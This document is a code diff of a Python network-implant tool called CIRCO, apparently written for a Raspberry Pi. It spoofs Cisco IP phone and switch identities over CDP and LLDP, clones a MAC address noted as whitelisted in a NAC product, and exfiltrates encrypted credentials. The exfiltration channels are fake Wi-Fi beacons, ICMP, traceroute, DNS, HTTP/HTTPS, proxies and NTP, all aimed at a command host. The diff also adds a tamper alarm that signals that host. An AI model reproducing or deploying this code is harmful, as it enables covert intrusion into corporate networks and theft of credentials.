@@ -11,22 +11,25 @@ import time
 import random
 import threading
 import unicodedata
-import daemon
+import datetime
+import socket
+import telnetlib
 import ipcalc
 import pyaes
 import pyscrypt
 import dns.resolver
 import requests
+from pyfiglet import Figlet
+import RPi.GPIO as GPIO
 # Remove Scapy IPv6 Warning
 sys.stderr = None
-# need Scapy >2.3.3 (CDP Checksum fix)
 from scapy.all import *
 # Revert back the STD output
 sys.stderr = sys.__stderr__
 
 # Me
 __author__ = "Emilio / @ekio_jp"
-__version__ = "1.4"
+__version__ = "1.5"
 
 # Default options OFF
 DEBUG = False
@@ -37,25 +40,29 @@ EDNS = False
 EWEB = False
 ESSL = False
 EPRX = False
+ENTP = False
 
 # Config
-phrase = 'Waaaaa! awesome :)'
-salt = 'salgruesa'
-phonemac = '10:8C:CF:75:AA:AA'
-switchmac = '00:8E:73:83:AA:BB'
+PHRASE = 'Waaaaa! awesome :)'
+SALT = 'salgruesa'
+WIFICHANNEL = '10'
+# this MAC is whitelisted in ForeScout NAC
+switchmac = '00:07:B4:00:FA:DE'
 switchport = 'FastEthernet0/3'
+phonemac = '10:8C:CF:75:BB:AA'
 serial = 'FCW1831C1AA'
 snpsu = 'LIT18300QBB'
 snmpcommunity = 'public'
-cchost = '172.16.2.1'
+cchost = '200.200.200.1'
 ccname = 'evil.sub.domain'
-dirname = '/home/pi/circo/circo/'
+dirname = '/home/pi-enc/circo/circo/'
+# fake-ssid (need to match jaula.py)
+SSIDroot = 'aterm-c17c02'
+SSIDalarm = 'pacman'
+# BSSID MAC from NEC ATERM routers
+wifimac = '98:f1:99:c1:7c:02'
 
 # Perm files
-motd = dirname + 'motd'
-phonecdptpl = dirname + 'phonecdp-tpl.pcap'
-swcdptpl = dirname + 'swcdp-tpl.pcap'
-aptpl = dirname + 'ap-tpl.pcap'
 snmptpl = dirname + 'Cisco_2960-tpl.snmpwalk'
 
 # Temp files
@@ -67,6 +74,163 @@ mastercred = dirname + time.strftime(
 
 
 # Classes
+class AlarmHandler(threading.Thread):
+    """
+    Class to handle case alarm
+    magnet will make contact when closing case, if open ring alarm and shutdown
+    Using GPIO 10 (real pin number)
+    """
+    def __init__(self, swmac, gwmac, ip, iface, wiface, dns, prx):
+        threading.Thread.__init__(self)
+        self.stoprequest = threading.Event()
+        self.switchmac = swmac
+        self.gwmac = gwmac
+        self.ip = ip
+        self.iface = iface
+        self.wiface = wiface
+        self.dns_srv = dns
+        self.prxlist = prx
+        GPIO.setmode(GPIO.BOARD)
+        GPIO.setup(10, GPIO.IN, pull_up_down=GPIO.PUD_DOWN)
+
+    def bang(self):
+
+        # Wifi SC 666
+        if EAP:
+            wifipkt = RadioTap(present='Channel', Channel=10, version=0, pad=0, len=12)/Dot11()/Dot11Beacon()/Dot11Elt()/Dot11EltRSN()
+            wifipkt[Dot11].addr2 = wifimac
+            wifipkt[Dot11].addr3 = wifimac
+            wifipkt[Dot11Elt].info = SSIDalarm
+            wifipkt[Dot11Elt].len = len(SSIDalarm)
+            wifipkt[Dot11].SC = 666
+            sendp(wifipkt, iface=self.wiface, inter=0.500, count=5, verbose=0)
+
+        # ICMP (IP.id 666)
+        if EPING:
+            pingpkt = (Ether(src=self.switchmac, dst=self.gwmac) /
+                       IP(ihl=5, src=self.ip, dst=cchost, id=666) /
+                       ICMP(id=random.randint(0, 0xFFFF),seq=1) /
+                       Raw(load='\x00\x00\x00\x00\x18\x83'
+                                '\xedt\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd\xab'
+                                '\xcd\xab\xcd\xab\xcd'))
+            pingpkt = pingpkt.__class__(str(pingpkt))
+            sendp(pingpkt, iface=self.iface, verbose=0)
+
+        # Trace (IP.id 666)
+        if ETRACE:
+            trcpkt = (Ether(src=self.switchmac, dst=self.gwmac) /
+                      IP(ihl=5, src=self.ip, dst=cchost, ttl=32, id=666) /
+                      UDP(sport=53200, dport=33434))
+            trcpkt = trcpkt.__class__(str(trcpkt))
+            sendp(trcpkt, iface=self.iface, verbose=0)
+
+        # DNS (NS 666.<domain>)
+        if EDNS:
+            dnspkt = (Ether(src=self.switchmac, dst=self.gwmac) /
+                      IP(ihl=5, src=self.ip, dst=self.dns_srv) /
+                      UDP(sport=53, dport=53) /
+                      DNS(rd=1,
+                          qd=DNSQR(
+                                   qname='666.'+ccname,
+                                   qtype='NS')))
+            dnspkt[IP].id = random.randint(0, 0xFFFF)
+            dnspkt[DNS].id = random.randint(0, 0xFFFF)
+            dnspkt = dnspkt.__class__(str(dnspkt))
+            sendp(dnspkt, iface=self.iface, verbose=0)
+
+        # HTTP/HTTPS (IP.id 666)
+        if EWEB or ESSL:
+            httppkt = (Ether(src=self.switchmac, dst=self.gwmac) /
+                       IP(ihl=5,
+                          flags='DF',
+                          src=self.ip,
+                          dst=cchost,
+                          id=666) /
+                       TCP(sport=random.randint(3025, 38000),
+                           ack=0,
+                           dataofs=10,
+                           reserved=0,
+                           flags='S',
+                           urgptr=0))
+            httppkt[TCP].options = [('MSS', 1460),
+                                    ('SAckOK', ''),
+                                    ('Timestamp',
+                                     (int(time.time()), 0)),
+                                    ('NOP', None),
+                                    ('WScale', 6)]
+            httppkt[TCP].seq = random.randint(1000000000,
+                                              1800000000)
+            httppkt[TCP].window = random.randint(30000, 40000)
+            if EWEB:
+                httppkt[TCP].dport = 80
+                httppkt = httppkt.__class__(str(httppkt))
+                sendp(httppkt, iface=self.iface, verbose=0)
+            if ESSL:
+                httppkt[TCP].dport = 443
+                httppkt = httppkt.__class__(str(httppkt))
+                sendp(httppkt, iface=self.iface, verbose=0)
+
+        # Proxy (NS 666.<domain>)
+        if EPRX and self.prxlist:
+            headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv11.0) like Gecko',
+                    'Accept-Enconding': ', '.join(('gzip', 'deflate')),
+                    'Accept': '*/*',
+                    'Connection': 'keep-alive'
+            }
+            fakeurl = 'http://666.' + ccname
+            for prx in range(len(self.prxlist)):
+                http_proxy = 'http://' + self.prxlist[prx]
+                proxydict = {
+                            'http': http_proxy,
+                            'https': http_proxy
+                            }
+                try:
+                    r = requests.get(fakeurl, headers=headers, proxies=proxydict)
+                except requests.exceptions.RequestException:
+                    pass
+
+        # NTP (Stratum 99)
+        if ENTP:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+            s.bind((self.ip, 123))
+            s.connect((cchost, 123))
+            timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
+            ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
+            ntppkt = '\xe3\x63\x14\x14\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + 4 * '\0'
+            s.send(ntppkt)
+
+    def run(self):
+        while not self.stoprequest.isSet():
+            button_state = GPIO.input(10)
+            if button_state is True:
+                # True => button pressed
+                # False => button not pressed
+                time.sleep(1)
+            else:
+                # Alarm! case open
+                if DEBUG:
+                    print('Awwwwww Case Open!!!! GAME OVER')
+                self.bang()
+                if DEBUG:
+                    #subprocess.call('echo o >/proc/sysrq-trigger', shell=True)
+                    print('Sayonara')
+                    os._exit(1)
+
+    def join(self):
+        GPIO.cleanup()
+        self.stoprequest.set()
+
+
 class APHandler(threading.Thread):
     """
     Class to handle the Fake AP broadcasting SSID for extraction
@@ -77,24 +241,21 @@ class APHandler(threading.Thread):
         self.stoprequest = threading.Event()
         self.wiface = wiface
         self.fd = fd
-        self.count = timer*2
+        self.count = timer
 
     def run(self):
         while not self.stoprequest.isSet():
             if os.path.isfile(self.fd):
-                # Load template beacon packet
-                wifipkt = rdpcap(aptpl, 1)[0]
-                # fake-ssid (need to match jaula_v1.py)
-                SSIDroot = 'aterm-c17c02'
-                # fake BSSID from NEC aterm routers
-                add2 = '98:f1:99:c1:7c:02'
-                wifipkt[Dot11].addr2 = add2
-                wifipkt[Dot11].addr3 = add2
                 with open(self.fd, 'r') as sfile:
                     for line in sfile:
+                        wifipkt = RadioTap(present='Channel', Channel=10, version=0, pad=0, len=12)/Dot11()/Dot11Beacon()/Dot11Elt()/Dot11EltRSN()
+                        wifipkt[Dot11].addr2 = wifimac
+                        wifipkt[Dot11].addr3 = wifimac
+                        wifipkt[Dot11Elt].info = SSIDroot
+                        wifipkt[Dot11Elt].len = len(SSIDroot)
                         if DEBUG:
                             print('Sending credentials via Fake-AP')
-                        cry = encrypti(line.strip())
+                        cry = encrypt(line.strip())
                         # split crypto len by 6
                         ar = [cry[i:i+6] for i in range(0, len(cry), 6)]
                         # padding
@@ -104,22 +265,22 @@ class APHandler(threading.Thread):
                         # send first SSID (with out -g)
                         wifipkt[Dot11].SC = len(ar)
                         wifipkt[Dot11Beacon].beacon_interval = len(cry)
-                        wifipkt[Dot11Elt].info = SSIDroot
-                        wifipkt[Dot11Elt].len = len(SSIDroot)
                         # send the rest of SSID (with -g)
-                        sendp(wifipkt, iface=self.wiface, inter=0.500,
+                        sendp(wifipkt, iface=self.wiface, inter=0.100,
                               count=self.count, verbose=0)
+                        #time.sleep(2)
                         for x in range(len(ar)):
-                            nadd2 = ('98:f1:99:' + ar[x][0:2] + ':' +
+                            nadd2 = (wifimac[0:9] + ar[x][0:2] + ':' +
                                      ar[x][2:4] + ':' + ar[x][4:6])
                             wifipkt[Dot11].SC = x
                             wifipkt[Dot11].addr2 = nadd2
                             wifipkt[Dot11].addr3 = nadd2
-                            wifipkt[Dot11Elt].info = 'aterm-' + ar[x] + '-g'
+                            wifipkt[Dot11Elt].info = SSIDroot[:-6:] + ar[x] + '-g'
                             wifipkt[Dot11Elt].len = len(wifipkt[Dot11Elt].info)
-                            sendp(wifipkt, iface=self.wiface, inter=0.500,
+                            sendp(wifipkt, iface=self.wiface, inter=0.100,
                                   count=self.count, verbose=0)
-                        time.sleep(60)
+                        time.sleep(2)
+                time.sleep(10)
 
     def join(self):
         self.stoprequest.set()
@@ -130,35 +291,85 @@ class CDPHandler(threading.Thread):
     Class to handle CDP packets, will start in background and send
     packets every 60 seconds, pretend to be a Cisco Phone or Switch
     """
-    def __init__(self, iface, pkt, mac, ip, name, port):
+    def __init__(self, iface, mac, ip, name, port, switch):
         threading.Thread.__init__(self)
         self.stoprequest = threading.Event()
         self.iface = iface
-        self.cdppkt = pkt[0]
         self.mac = mac
         self.ip = ip
         self.name = name
         self.port = port
+        self.switch = switch
 
     def run(self):
-        # Build Fake CDP packet using template (phone or switch)
-        fakepkt = self.cdppkt
-        ip = self.ip
+        # Build Fake CDP packet
+        fakepkt = Dot3()/LLC()/SNAP()/CDPv2_HDR()
+        fakepkt[Dot3].dst = '01:00:0c:cc:cc:cc'
+        fakepkt[Dot3].src = self.mac
+        fakepkt[CDPv2_HDR].msg = CDPMsgDeviceID()
+        fakepkt[CDPMsgDeviceID].val = self.name
+        fakepkt[CDPMsgDeviceID].len = len(fakepkt[CDPMsgDeviceID])
+        fakepkt = fakepkt/CDPMsgSoftwareVersion()
+	if self.switch:
+            fakepkt[CDPMsgSoftwareVersion].val = 'Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE (fc1)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled Sat 28-Jul-12 00:29 by prod_rel_team'
+	else:
+            fakepkt[CDPMsgSoftwareVersion].val = 'SIP75.8-5-3SR1S'
+
+        fakepkt[CDPMsgSoftwareVersion].len = len(fakepkt[CDPMsgSoftwareVersion])
+        fakepkt = fakepkt/CDPMsgPlatform()
+        if self.switch:
+            fakepkt[CDPMsgPlatform].val = 'cisco WS-C2960-8TC-L'
+        else:
+            fakepkt[CDPMsgPlatform].val = 'Cisco IP Phone 7975'
+        fakepkt[CDPMsgPlatform].len = len(fakepkt[CDPMsgPlatform])
+        fakepkt = fakepkt/CDPMsgAddr()
+        fakepkt[CDPMsgAddr].naddr = 1
+        fakepkt[CDPMsgAddr].addr = CDPAddrRecordIPv4()
+        fakepkt[CDPMsgAddr][CDPAddrRecordIPv4].addr = self.ip
+        fakepkt = fakepkt/CDPMsgPortID()
+        fakepkt[CDPMsgPortID].iface = self.port
+        fakepkt[CDPMsgPortID].len = len(fakepkt[CDPMsgPortID])
+        if self.switch:
+            fakepkt = fakepkt/CDPMsgCapabilities(cap=40)
+            fakepkt = fakepkt/CDPMsgProtoHello()
+            fakepkt[CDPMsgProtoHello].protocol_id = 0x112
+            fakepkt[CDPMsgProtoHello].data = '\x00\x00\x00\x00\xff\xff\xff\xff\x01\x02!\xff\x00\x00\x00\x00\x00\x00X\x97\x1e\x1c/\x00\xff\x00\x00'
+            fakepkt[CDPMsgProtoHello].len = len(fakepkt[CDPMsgProtoHello])
+            fakepkt = fakepkt/CDPMsgVTPMgmtDomain()
+            fakepkt[CDPMsgVTPMgmtDomain].len = len(fakepkt[CDPMsgVTPMgmtDomain])
+            fakepkt = fakepkt/CDPMsgNativeVLAN()
+            fakepkt[CDPMsgNativeVLAN].vlan = 100
+            fakepkt[CDPMsgNativeVLAN].len = len(fakepkt[CDPMsgNativeVLAN])
+            fakepkt = fakepkt/CDPMsgDuplex(duplex=1)
+            fakepkt = fakepkt/CDPMsgTrustBitmap()
+            fakepkt = fakepkt/CDPMsgUntrustedPortCoS()
+            fakepkt = fakepkt/CDPMsgMgmtAddr()
+            fakepkt[CDPMsgMgmtAddr].naddr = 1
+            fakepkt[CDPMsgMgmtAddr].addr = CDPAddrRecordIPv4()
+            fakepkt[CDPMsgMgmtAddr][CDPAddrRecordIPv4].addr = self.ip
+            fakepkt = fakepkt/CDPMsgGeneric()
+            fakepkt[CDPMsgGeneric].type = 26
+            fakepkt[CDPMsgGeneric].val = '\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff'
+            fakepkt[CDPMsgGeneric].len = len(fakepkt[CDPMsgGeneric])
+            fakepkt = fakepkt/CDPMsgGeneric(type=31, len=5, val='\x00')
+            fakepkt = fakepkt/CDPMsgGeneric(type=4099, len=5, val='1')
+        else:
+            fakepkt = fakepkt/CDPMsgCapabilities(cap=1168)
+            fakepkt = fakepkt/CDPMsgGeneric()
+            fakepkt[CDPMsgGeneric].type = 28
+            fakepkt[CDPMsgGeneric].val = '\x00\x02\x00'
+            fakepkt[CDPMsgGeneric].len = len(fakepkt[CDPMsgGeneric])
+            fakepkt = fakepkt/CDPMsgUnknown19()
+            fakepkt[CDPMsgUnknown19].type = 25
+            fakepkt[CDPMsgUnknown19].val = 'y\x85\x00\x00\x00\x00.\xe0'
+            fakepkt[CDPMsgUnknown19].len = len(fakepkt[CDPMsgUnknown19])
+            fakepkt = fakepkt/CDPMsgDuplex(duplex=1)
+            fakepkt = fakepkt/CDPMsgPower(type=16,power=12000)
+
+        # re-calculate len & cksum
         del fakepkt.cksum
         del fakepkt.len
-        fakepkt[Dot3].src = self.mac
-        fakepkt[CDPv2_HDR][CDPMsgAddr][CDPAddrRecordIPv4].addr = ip
-        # Mgmt IP field used for switches (not phone)
-        if 'Phone' not in fakepkt[CDPv2_HDR][CDPMsgPlatform].val:
-            fakepkt[CDPv2_HDR][CDPMsgMgmtAddr][CDPAddrRecordIPv4].addr = ip
-        fakepkt[CDPv2_HDR][CDPMsgDeviceID].val = self.name
-        fakepkt[CDPv2_HDR][CDPMsgDeviceID].len = len(
-                                            fakepkt[CDPv2_HDR][CDPMsgDeviceID])
-        fakepkt[CDPv2_HDR][CDPMsgPortID].iface = self.port
-        fakepkt[CDPv2_HDR][CDPMsgPortID].len = len(
-                                            fakepkt[CDPv2_HDR][CDPMsgPortID])
         fakepkt.len = len(fakepkt[CDPv2_HDR]) + 8
-        # re-calculate cksum
         fakepkt = fakepkt.__class__(str(fakepkt))
 
         while not self.stoprequest.isSet():
@@ -174,7 +385,7 @@ class LLDPHandler(threading.Thread):
     Class to handle LLDP packets, will start in background and send
     packets every 30 seconds, pretend to be a Cisco Phone or Switch
     """
-    def __init__(self, iface, mac, ip, name, port, switch=True):
+    def __init__(self, iface, mac, ip, name, port, switch):
         threading.Thread.__init__(self)
         self.stoprequest = threading.Event()
         self.iface = iface
@@ -185,61 +396,24 @@ class LLDPHandler(threading.Thread):
         self.switch = switch
 
     def run(self):
-        pkteth = Ether()
-        pkteth.dst = '01:80:c2:00:00:0e'
-        pkteth.src = self.mac
-        pkteth.type = 35020
-
-        pktchass = LLDPDUChassisID()
-        pktchass._type = 1
-        pktchass.subtype = 4
-        pktchass._length = 7
-        pktchass.id = self.mac
-
-        pktportid = LLDPDUPortID()
-        pktportid._type = 2
-        pktportid.subtype = 5
+        pkteth = Ether(dst='01:80:c2:00:00:0e', src=self.mac, type=35020)
+        pktchass = LLDPDUChassisID(_type=1, subtype=4, _length=7, id=self.mac)
+        pktportid = LLDPDUPortID(_type=2, subtype=5)
         pktportid.id = self.port[:2] + re.findall(r'[0-9/]+', self.port)[0]
         pktportid._length = len(pktportid[LLDPDUPortID].id) + 1
-
-        pktttl = LLDPDUTimeToLive()
-        pktttl._type = 3
-        pktttl.ttl = 120
-        pktttl._length = 2
-
-        pktsys = LLDPDUSystemName()
-        pktsys._type = 5
-        pktsys.system_name = self.name
+        pktttl = LLDPDUTimeToLive(_type=3, ttl=120, _length=2)
+        pktsys = LLDPDUSystemName(_type=5, system_name=self.name)
         pktsys._length = len(pktsys[LLDPDUSystemName].system_name)
-
-        pktdes = LLDPDUSystemDescription()
-        pktdes._type = 6
-
+        pktdes = LLDPDUSystemDescription(_type=6)
         if self.switch:
-            pktdes.description = 'Cisco IOS Software, C2960 Software \
-                (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE \
-                (fc1)\nTechnical Support: http://www.cisco.com/techsupport\n\
-                Copyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled \
-                Sat 28-Jul-12 00:29 by prod_rel_team'
+            pktdes.description = 'Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE, RELEASE SOFTWARE (fc1)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2012 by Cisco Systems, Inc.\nCompiled Sat 28-Jul-12 00:29 by prod_rel_team'
         else:
             pktdes.description = 'SIP75.8-5-3SR1S'
-
         pktdes._length = len(pktdes[LLDPDUSystemDescription].description)
-
-        pktport = LLDPDUPortDescription()
-        pktport._type = 4
-        pktport.description = self.port
+        pktport = LLDPDUPortDescription(_type=4, description=self.port)
         pktport._length = len(pktport[LLDPDUPortDescription].description)
-
-        pktsyscap = LLDPDUSystemCapabilities()
-        pktsyscap._type = 7
-        pktsyscap._length = 4
-        pktsyscap.mac_bridge_available = 1
-        pktsyscap.mac_bridge_enabled = 1
-
-        pktmgt = LLDPDUManagementAddress()
-        pktmgt._type = 8
-        pktmgt._length = 12
+        pktsyscap = LLDPDUSystemCapabilities(_type=7, _length=4, mac_bridge_available=1, mac_bridge_enabled=1)
+        pktmgt = LLDPDUManagementAddress(_type=8, _length=12)
         pktmgt.management_address = (chr(int(self.ip.split('.')[0]))
                                      + chr(int(self.ip.split('.')[1]))
                                      + chr(int(self.ip.split('.')[2]))
@@ -250,25 +424,9 @@ class LLDPHandler(threading.Thread):
         pktmgt.interface_number = long(100)
         pktmgt._oid_string_length = 0
         pktmgt.object_id = ''
-
-        pkt8021 = LLDPDUGenericOrganisationSpecific()
-        pkt8021._type = 127
-        pkt8021._length = 6
-        pkt8021.org_code = 32962
-        pkt8021.subtype = 1
-        pkt8021.data = '\x00d'
-
-        pkt8023 = LLDPDUGenericOrganisationSpecific()
-        pkt8023._type = 127
-        pkt8023._length = 9
-        pkt8023.org_code = 4623
-        pkt8023.subtype = 1
-        pkt8023.data = '\x03l\x03\x00\x10'
-
-        pktend = LLDPDUEndOfLLDPDU()
-        pktend[LLDPDUEndOfLLDPDU]._type = 0
-        pktend[LLDPDUEndOfLLDPDU]._length = 0
-
+        pkt8021 = LLDPDUGenericOrganisationSpecific(_type=127, _length=6, org_code=32962, subtype=1, data='\x00d')
+        pkt8023 = LLDPDUGenericOrganisationSpecific(_type=127, _length=9, org_code=4623, subtype=1, data='\x03l\x03\x00\x10')
+        pktend = LLDPDUEndOfLLDPDU(_type=0, _length=0)
         pkt = pkteth / pktchass / pktportid / pktttl / pktsys / pktdes \
             / pktport / pktsyscap / pktmgt / pkt8021 / pkt8023 / pktend
 
@@ -318,11 +476,10 @@ class DHCPHandler(threading.Thread):
     """
     Class for DHCP responses, parse it and return the details
     """
-    def __init__(self, iface, hostname):
+    def __init__(self, iface):
         threading.Thread.__init__(self)
         self.stoprequest = threading.Event()
         self.iface = iface
-        self.hostname = hostname
         self.offer = 1
         self._rtn_ip = None
         self._rtn_mask = None
@@ -337,7 +494,7 @@ class DHCPHandler(threading.Thread):
             ipaddr = pkt[BOOTP].yiaddr
             sip = pkt[BOOTP].siaddr
             mac = get_if_hwaddr(self.iface)
-            if (mtype == 2) and (self.offer <= 1):
+            if (mtype == 2) and (self.offer <= 1) and (pkt[Ether].dst == mac):
                 self.offer = self.offer + 1
                 for opt in pkt[DHCP].options:
                     if 'router' in opt:
@@ -365,7 +522,6 @@ class DHCPHandler(threading.Thread):
                            DHCP(options=[('message-type', 'request'),
                                          ('server_id', sip),
                                          ('requested_addr', ipaddr),
-                                         #('hostname', self.hostname),
                                          ('param_req_list', 0),
                                          ('end')
                                          ])
@@ -432,22 +588,37 @@ def grep(fd, pattern):
     else:
         return False
 
+def grepline(fd, pattern):
+    if os.path.isfile(fd):
+        with open(fd, "r") as sfile:
+            lines = sfile.readlines()
+            for line in lines:
+                if pattern in line:
+                    return line
+
 # IP Dotted format to hex for exfiltration
 def strtohex(ip):
     return ''.join('{:02x}'.format(int(char)) for char in ip.split('.'))
 
+# Hex to IP Dotted format
+def hextoip(ip):
+    n = 2
+    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])
+
 # Look around for CDP/LLDP searching for device names
-def discover(opciones):
+def discover(iface):
     cli = open(clifd, 'w')
-    cdpname = sniff(iface=opciones.nic,
-                    filter='ether[20:2] == 0x2000', count=1, timeout=60)
-    lldpname = sniff(iface=opciones.nic,
-                     filter='ether proto 0x88cc', count=1, timeout=60)
+    cdpname = sniff(iface=iface,
+                    filter='ether[20:2] == 0x2000', count=1, timeout=61)
+    lldpname = sniff(iface=iface,
+                     filter='ether proto 0x88cc', count=1, timeout=31)
     if cdpname:
         cli.write('<CDPNAME>,'
                   + cdpname[0][CDPv2_HDR][CDPMsgDeviceID].val.split('.')[0] + '\n')
         cli.write('<CDPINT>,'
                   + cdpname[0][CDPv2_HDR][CDPMsgPortID].iface + '\n')
+        cli.write('<CDPIP>,'
+                  + cdpname[0][CDPv2_HDR][CDPAddrRecordIPv4].addr + '\n')
         cli.write('<CDPMODEL>,'
                   + str(cdpname[0][CDPv2_HDR][CDPMsgPlatform].val).split()[1]
                   + '\n')
@@ -457,6 +628,8 @@ def discover(opciones):
         cli.write('<LLDPINT>,'
                   + lldpname[0][LLDPDU][LLDPDUPortDescription].description
                   + '\n')
+        cli.write('<LLDPIP>,'
+                  + hextoip(lldpname[0][LLDPDU][LLDPDUManagementAddress].management_address.encode('hex')) + '\n')
     cli.close()
 
 # Take interface down before MAC changing 
@@ -482,6 +655,7 @@ def setip(iface, ip, mask, gw, dns_srv):
 
 # Generate fake switch name
 def newname(cname):
+    cname = cname.split('.')[0]
     laststr = cname[-1:]
     if laststr.isdigit():
         total = int(laststr) + 2
@@ -573,10 +747,36 @@ def getpac(ip, url):
     except requests.exceptions.RequestException:
         return None
 
+# Telnet Banner Grabber
+def telnetgrab(listip):
+    buf = ''
+    for ip in listip:
+        try:
+            tn = telnetlib.Telnet(ip, 23, 3)
+        except:
+            continue
+        try:
+            buf = tn.read_until("sername: ", 3)
+            break
+        except:
+            try:
+                buf = tn.read_until("assword: ", 3)
+                break
+            except:
+                try:
+                    buf = tn.read_until("ogin: ", 3)
+                    break
+                except:
+                    pass
+    if buf:
+        return buf
+    else:
+        return None
+
 
 # AES crypto
-def encrypti(cleartxt):
-    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
+def encrypt(cleartxt):
+    hashed = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
     key = hashed.encode('hex')
     aes = pyaes.AESModeOfOperationCTR(key)
     ciphertxt = aes.encrypt(cleartxt)
@@ -584,11 +784,20 @@ def encrypti(cleartxt):
 
 
 def parsingopt():
-    parser = argparse.ArgumentParser()
+    f = Figlet(font='standard')
+    print(f.renderText('CIRCO'))
+    print('Author: ' + __author__)
+    print('Version: ' + __version__ + '\n')
+    parser = argparse.ArgumentParser(add_help=True)
+    command_group_mode = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Enable debugging')
-    parser.add_argument('-i', dest='nic', required=True, metavar='<eth0>',
-                        default='eth0', help='Interface: eth0')
+    command_group_mode.add_argument('-i', dest='nic', metavar='<eth0>',
+                        help='Single Mode: <eth0>')
+    command_group_mode.add_argument('-b', '--bridge', action='store_true',
+                        help='Bridge Mode: Use eth0 & eth1')
+    parser.add_argument('-A', '--ALL', action='store_true',
+                        help='All exfiltration except wifi')
     parser.add_argument('-p', '--ping', action='store_true',
                         help='PING exfiltration')
     parser.add_argument('-t', '--trace', action='store_true',
@@ -601,6 +810,8 @@ def parsingopt():
                         help='HTTPS exfiltration')
     parser.add_argument('-x', '--prx', action='store_true',
                         help='Proxy exfiltration')
+    parser.add_argument('-n', '--ntp', action='store_true',
+                        help='NTP exfiltration')
     parser.add_argument('-a', dest='wnic', metavar='<wlan1>',
                         help='Wireles exfiltration')
     if len(sys.argv) > 1:
@@ -609,10 +820,6 @@ def parsingopt():
         except IOError, msg:
             parser.error(str(msg))
     else:
-        with open(motd, 'r') as sfile:
-            print(sfile.read())
-        print('Author: ' + __author__)
-        print('Version: ' + __version__ + '\n')
         parser.print_help()
         sys.exit(1)
 
@@ -628,52 +835,82 @@ def main():
     global EWEB
     global ESSL
     global EPRX
-    opciones = parsingopt()
-    if opciones.verbose:
+    global ENTP
+    options = parsingopt()
+    if options.verbose:
         DEBUG = True
-    if opciones.nic:
-        iface = opciones.nic
-    if opciones.wnic:
-        wiface = opciones.wnic
-        EAP = True
-    if opciones.ping:
+    if options.nic:
+        iface = options.nic
+    elif options.bridge:
+        iface = 'br0'
+    if options.ALL:
         EPING = True
-    if opciones.trace:
         ETRACE = True
-    if opciones.dns:
         EDNS = True
-    if opciones.web:
         EWEB = True
-    if opciones.ssl:
         ESSL = True
-    if opciones.prx:
         EPRX = True
+        ENTP = True
+    if options.wnic:
+        wiface = options.wnic
+        EAP = True
+    if options.ping:
+        EPING = True
+    if options.trace:
+        ETRACE = True
+    if options.dns:
+        EDNS = True
+    if options.web:
+        EWEB = True
+    if options.ssl:
+        ESSL = True
+    if options.prx:
+        EPRX = True
+    if options.ntp:
+        ENTP = True
 
     # Load Scapy modules
     load_contrib("cdp")
     load_contrib("lldp")
 
     # Bring LAN interface up
-    #subprocess.call('/sbin/ifconfig ' + iface + ' up', shell=True)
-
-    # Change MAC, became a Cisco IP-Phone!
-    if DEBUG:
-        print('MAC change started - phone')
-    changemac(iface, phonemac)
-    if DEBUG:
-        print('MAC change ended - phone')
+    if options.nic:
+        # Change MAC, became a Cisco IP-Phone!
+        if DEBUG:
+            print('MAC change started - phone')
+        changemac(iface, phonemac)
+        if DEBUG:
+            print('MAC change ended - phone')
+    if options.bridge:
+        # Bring Bridge interface up
+        subprocess.call('/sbin/brctl addbr br0', shell=True)
+        subprocess.call('/sbin/brctl addif br0 eth0', shell=True)
+        subprocess.call('/sbin/brctl addif br0 eth1', shell=True)
+        subprocess.call('/sbin/brctl setfd br0 0', shell=True)
+        subprocess.call('/sbin/ifconfig br0 up', shell=True)
+        subprocess.call('/sbin/ifconfig eth0 up', shell=True)
+        subprocess.call('/sbin/ifconfig eth1 up', shell=True)
+        # Change MAC, became a Cisco Switch!
+        if DEBUG:
+            print('MAC change started - switch')
+        changemac(iface, switchmac)
+        if DEBUG:
+            print('MAC change ended - switch')
 
     # Listen for CDP packets to get hostname from it
     if DEBUG:
         print('CDP/LLDP discover started')
-    discover(opciones)
+    if options.bridge:
+        discover('eth0')
+    else:
+        discover(iface)
     if DEBUG:
         print('CDP/LLDP discover ended')
 
     # Grab an IP using DHCP
     if DEBUG:
         print('DHCP started')
-    dh = DHCPHandler(iface, 'SEP' + phonemac.replace(':', ''))
+    dh = DHCPHandler(iface)
     dh.daemon = True
     dh.start()
     time.sleep(0.5)
@@ -685,10 +922,11 @@ def main():
                     UDP(sport=68, dport=67) /
                     BOOTP(chaddr=chaddr, xid=xid) /
                     DHCP(options=[('message-type', 'discover'), 'end'])
-                    )
+                   )
     sendp(dhcpdiscover, iface=iface, verbose=0)
     time.sleep(10)
     ip, netmask, gwip, dns_srv, domain, wpad = dh.join()
+    # TODO
     # need to add module for static ip in case DHCP doesn't work
     if DEBUG:
         print('DHCP ended')
@@ -714,51 +952,51 @@ def main():
     if DEBUG:
         print('ARP gw ended')
 
-    # Pretend to be a phone to bypass NAC, tune the amount of time you want
-    cdppkt = rdpcap(phonecdptpl, 1)
-    cdpdh = CDPHandler(iface, cdppkt, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1')
